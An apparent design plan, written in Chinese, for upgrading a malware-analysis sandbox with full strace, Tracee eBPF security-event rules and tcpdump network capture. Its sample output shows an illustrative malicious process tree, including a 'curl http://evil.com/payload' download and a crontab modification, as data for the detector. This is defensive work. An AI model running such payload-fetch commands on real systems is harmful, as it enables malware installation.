# 动态分析升级计划：基于 CSIT 方案集成 strace + Tracee

## TL;DR

> **目标**: 将当前简单的 QEMU `-strace` 方案升级为专业级动态分析系统
> 
> **核心改进**:
> - 使用完整 strace 替代 QEMU 内置 strace（更详细的输出）
> - 集成 Tracee 进行 eBPF 级别的安全事件检测
> - 添加网络流量捕获
> - 改进结果解析和展示
>
> **预计工作量**: Medium (2-3 天)

---

## 一、当前实现分析

### 1.1 现有架构

```
tools/dynamic/
├── __init__.py
├── emulator.py      # BinaryEmulator - QEMU 模拟执行
└── monitor.py       # ProcessMonitor - psutil 进程监控（未使用）
```

### 1.2 当前工作流程

```
1. coordinator._run_dynamic_analysis() 被调用
2. 从 ELF 解析结果获取架构信息
3. 调用 DynamicAnalyzer.emulate(binary_path, arch)
4. BinaryEmulator 尝试三种方式执行:
   a. Docker SDK + QEMU -strace
   b. Docker CLI + QEMU -strace  
   c. Host QEMU -strace
5. 解析 QEMU strace 输出，提取 syscall 列表
6. 返回结果
```

### 1.3 当前问题

| 问题 | 影响 | 严重程度 |
|------|------|----------|
| QEMU `-strace` 输出格式简单 | 缺少时间戳、返回值、耗时 | 中 |
| 无法跟踪子进程 | 漏掉 fork/clone 后的行为 | 高 |
| 无网络流量捕获 | 无法分析 C2 通信 | 高 |
| 无安全事件检测 | 无法识别恶意行为模式 | 高 |
| 无文件系统监控 | 无法追踪文件创建/修改 | 中 |
| psutil monitor 未被使用 | 代码冗余 | 低 |

### 1.4 当前输出示例

```python
{
    "success": True,
    "method": "docker_cli",
    "syscalls": [
        {"name": "read", "args": "3,0x7fff...,4096"},
        {"name": "write", "args": "1,0x7fff...,13"},
    ],
    "syscall_count": 2,
    "error": None
}
```

---

## 二、目标架构（基于 CSIT 方案）

### 2.1 新架构设计

```
tools/dynamic/
├── __init__.py
├── sandbox.py           # [新增] DockerSandbox - 沙箱管理
├── strace_analyzer.py   # [新增] 完整 strace 分析
├── tracee_analyzer.py   # [新增] Tracee eBPF 分析
├── network_capture.py   # [新增] 网络流量捕获
├── result_parser.py     # [新增] 结果解析和聚合
├── emulator.py          # [保留] 作为 fallback
└── monitor.py           # [删除] 不再需要
```

### 2.2 新工作流程

```
┌─────────────────────────────────────────────────────────────────┐
│                    DynamicAnalysisOrchestrator                   │
│  1. 检查环境 (Docker, Tracee 可用性)                              │
│  2. 选择分析策略                                                  │
│  3. 协调各组件执行                                                │
│  4. 聚合结果                                                      │
└─────────────────────────────────────────────────────────────────┘
                              │
        ┌─────────────────────┼─────────────────────┐
        ▼                     ▼                     ▼
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ DockerSandbox │    │    Tracee     │    │   tcpdump     │
│               │    │   Container   │    │   Container   │
│ - 创建容器     │    │               │    │               │
│ - 执行样本     │    │ - eBPF 监控   │    │ - 网络捕获    │
│ - strace 跟踪  │    │ - 安全事件    │    │ - pcap 输出   │
└───────────────┘    └───────────────┘    └───────────────┘
        │                     │                     │
        └─────────────────────┼─────────────────────┘
                              ▼
                    ┌───────────────────┐
                    │   ResultParser    │
                    │                   │
                    │ - 解析 strace     │
                    │ - 解析 Tracee JSON│
                    │ - 解析 pcap       │
                    │ - 生成报告        │
                    └───────────────────┘
```

### 2.3 目标输出示例

```python
{
    "success": True,
    "method": "docker_strace_tracee",
    "duration_seconds": 30,
    
    # strace 详细输出
    "syscalls": {
        "total_count": 1523,
        "unique_count": 45,
        "by_category": {
            "file": ["open", "read", "write", "close", "unlink"],
            "network": ["socket", "connect", "sendto", "recvfrom"],
            "process": ["fork", "clone", "execve", "exit"],
        },
        "timeline": [
            {"timestamp": "12:00:01.123", "pid": 1234, "name": "execve", "args": "...", "result": 0, "duration": 0.001},
            # ...
        ]
    },
    
    # Tracee 安全事件
    "security_events": [
        {
            "event": "fileless_execution",
            "severity": "high",
            "description": "Process executed from memory without file on disk",
            "mitre_ttp": "T1620",
            "details": {...}
        },
        {
            "event": "hidden_file_created", 
            "severity": "medium",
            "path": "/tmp/.malware",
            "mitre_ttp": "T1564.001",
        }
    ],
    
    # 网络活动
    "network": {
        "connections": [
            {"remote_ip": "192.168.1.100", "remote_port": 443, "protocol": "tcp"},
        ],
        "dns_queries": [
            {"domain": "evil.com", "response": "1.2.3.4"}
        ],
        "pcap_path": "/tmp/analysis/traffic.pcap"  # 可选下载
    },
    
    # 文件活动
    "file_activity": {
        "created": ["/tmp/.hidden", "/dev/shm/payload"],
        "modified": ["/etc/crontab"],
        "deleted": ["/tmp/original_binary"]
    },
    
    # 进程树
    "process_tree": {
        "pid": 1234,
        "name": "malware",
        "children": [
            {"pid": 1235, "name": "sh", "cmdline": "sh -c whoami"},
            {"pid": 1236, "name": "curl", "cmdline": "curl http://evil.com/payload"}
        ]
    }
}
```

---

## 三、详细改动计划

### 3.1 需要删除的文件

| 文件 | 原因 |
|------|------|
| `tools/dynamic/monitor.py` | psutil 监控方案被 Tracee 替代 |

### 3.2 需要保留并修改的文件

| 文件 | 修改内容 |
|------|----------|
| `tools/dynamic/emulator.py` | 保留作为 fallback，当 Docker/Tracee 不可用时使用 |
| `tools/dynamic/__init__.py` | 更新导出 |
| `core/coordinator.py` | 修改 `_run_dynamic_analysis()` 使用新组件 |
| `config.yaml` | 添加 Tracee 相关配置 |
| `core/config.py` | 添加 Tracee 配置类 |

### 3.3 需要新增的文件

| 文件 | 功能 |
|------|------|
| `tools/dynamic/sandbox.py` | Docker 沙箱管理 |
| `tools/dynamic/strace_analyzer.py` | 完整 strace 执行和解析 |
| `tools/dynamic/tracee_analyzer.py` | Tracee 集成 |
| `tools/dynamic/network_capture.py` | 网络流量捕获 |
| `tools/dynamic/result_parser.py` | 结果聚合 |
| `tools/dynamic/orchestrator.py` | 动态分析协调器 |

---

## 四、实现细节

### 4.1 DockerSandbox (sandbox.py)

```python
class DockerSandbox:
    """管理分析沙箱容器"""
    
    IMAGE_TAG = "threatscope/sandbox:v2"
    
    DOCKERFILE = '''
    FROM ubuntu:22.04
    ENV DEBIAN_FRONTEND=noninteractive
    
    RUN apt-get update && apt-get install -y --no-install-recommends \
        strace \
        tcpdump \
        inotify-tools \
        qemu-user-static \
        file \
        && rm -rf /var/lib/apt/lists/*
    
    # 创建分析用户
    RUN useradd -r -u 10000 sandbox && \
        mkdir -p /sandbox/output /sandbox/sample && \
        chown -R sandbox:sandbox /sandbox
    
    WORKDIR /sandbox
    '''
    
    def create(self, name: str) -> str:
        """创建沙箱容器"""
        
    def execute_with_strace(self, binary_path: str, timeout: int) -> dict:
        """使用 strace 执行样本"""
        
    def cleanup(self):
        """清理容器"""
```

### 4.2 StraceAnalyzer (strace_analyzer.py)

```python
class StraceAnalyzer:
    """完整的 strace 分析"""
    
    def execute(self, container_name: str, binary_path: str, timeout: int) -> StraceResult:
        """
        在容器内执行:
        strace -f -ff -tt -T -o /sandbox/output/strace \
            -e trace=file,network,process,desc \
            timeout --signal=KILL {timeout} {binary}
        """
        
    def parse_output(self, output_dir: str) -> dict:
        """解析 strace 输出文件"""
        # 支持 -ff 生成的多进程日志
```

### 4.3 TraceeAnalyzer (tracee_analyzer.py)

```python
class TraceeAnalyzer:
    """Tracee eBPF 安全事件检测"""
    
    TRACEE_IMAGE = "aquasec/tracee:latest"
    
    # 分析策略 (基于 CSIT 文章)
    POLICY = '''
    apiVersion: tracee.aquasec.com/v1beta1
    kind: Policy
    metadata:
      name: malware-analysis
    spec:
      scope:
        - container={container_name}
        - follow
      rules:
        # 安全事件
        - event: fileless_execution
        - event: hidden_file_created
        - event: dynamic_code_loading
        - event: stdio_over_socket
        - event: ld_preload
        - event: scheduled_task_mod
        - event: kernel_module_loading
        - event: dropped_executable
        - event: anti_debugging
        - event: syscall_hooking
        # 网络事件
        - event: net_packet_dns
        - event: net_tcp_connect
        # 系统调用 (可选)
        - event: sched_process_exec
        - event: sched_process_fork
    '''
    
    def start(self, target_container: str) -> str:
        """启动 Tracee 容器监控目标容器"""
        
    def stop_and_collect(self) -> list[dict]:
        """停止并收集事件"""
        
    def parse_events(self, events: list[dict]) -> dict:
        """解析事件，提取安全发现"""
```

### 4.4 NetworkCapture (network_capture.py)

```python
class NetworkCapture:
    """网络流量捕获"""
    
    def start(self, network_name: str, output_path: str):
        """启动 tcpdump 容器"""
        
    def stop_and_collect(self) -> dict:
        """停止并解析 pcap"""
        # 提取 DNS 查询、HTTP 请求、连接信息
```

### 4.5 DynamicAnalysisOrchestrator (orchestrator.py)

```python
class DynamicAnalysisOrchestrator:
    """协调所有动态分析组件"""
    
    def __init__(self, config: DynamicAnalysisConfig):
        self.sandbox = DockerSandbox()
        self.strace = StraceAnalyzer()
        self.tracee = TraceeAnalyzer() if config.enable_tracee else None
        self.network = NetworkCapture() if config.enable_network_capture else None
        self.fallback = BinaryEmulator()  # 保留原有实现作为 fallback
    
    async def analyze(self, binary_path: str, arch: str) -> DynamicAnalysisResult:
        """
        执行完整动态分析:
        1. 检查环境
        2. 创建沙箱
        3. 启动 Tracee (如果可用)
        4. 启动网络捕获 (如果启用)
        5. 执行样本 (strace)
        6. 收集所有结果
        7. 清理
        """
```

---

## 五、配置更新

### 5.1 config.yaml 新增

```yaml
dynamic_analysis:
  # 基础配置
  timeout: 30
  enable: true
  
  # strace 配置
  strace:
    trace_children: true      # -f 跟踪子进程
    separate_files: true      # -ff 每个进程单独文件
    timestamps: true          # -tt 时间戳
    syscall_times: true       # -T 系统调用耗时
    categories:               # 跟踪的系统调用类别
      - file
      - network
      - process
      - desc
  
  # Tracee 配置
  tracee:
    enable: true
    image: "aquasec/tracee:latest"
    security_events:          # 启用的安全事件检测
      - fileless_execution
      - hidden_file_created
      - dynamic_code_loading
      - stdio_over_socket
      - ld_preload
      - scheduled_task_mod
      - dropped_executable
      - anti_debugging
  
  # 网络捕获配置
  network_capture:
    enable: true
    max_packets: 10000
    parse_dns: true
    parse_http: true
```

---

## 六、实施步骤

### Phase 1: 基础重构 (Day 1)

- [ ] 1.1 创建 `tools/dynamic/sandbox.py` - Docker 沙箱管理
- [ ] 1.2 创建 `tools/dynamic/strace_analyzer.py` - 完整 strace 实现
- [ ] 1.3 更新 Dockerfile 添加必要工具
- [ ] 1.4 测试基础 strace 功能

### Phase 2: Tracee 集成 (Day 2)

- [ ] 2.1 创建 `tools/dynamic/tracee_analyzer.py`
- [ ] 2.2 创建分析策略文件
- [ ] 2.3 实现事件解析
- [ ] 2.4 测试 Tracee 集成

### Phase 3: 网络捕获 (Day 2)

- [ ] 3.1 创建 `tools/dynamic/network_capture.py`
- [ ] 3.2 实现 pcap 解析
- [ ] 3.3 测试网络捕获

### Phase 4: 整合 (Day 3)

- [ ] 4.1 创建 `tools/dynamic/orchestrator.py`
- [ ] 4.2 更新 `core/coordinator.py`
- [ ] 4.3 更新配置文件
- [ ] 4.4 删除 `tools/dynamic/monitor.py`
- [ ] 4.5 更新前端显示

### Phase 5: 测试和文档 (Day 3)

- [ ] 5.1 本地测试
- [ ] 5.2 服务器部署测试
- [ ] 5.3 更新文档

---

## 七、风险和缓解

| 风险 | 缓解措施 |
|------|----------|
| Tracee 需要 privileged 权限 | 提供配置开关，可禁用 Tracee |
| 服务器可能没有 Docker | 保留原有 QEMU fallback |
| Tracee 可能产生大量事件 | 使用 Policy 限制范围 |
| 网络捕获可能很大 | 限制 max_packets |

---

## 八、成功标准

1. ✅ strace 输出包含时间戳、返回值、耗时
2. ✅ 能跟踪所有子进程
3. ✅ Tracee 能检测至少 5 种安全事件
4. ✅ 能捕获 DNS 查询和网络连接
5. ✅ 超时后正确清理所有容器
6. ✅ 前端能展示新的详细结果
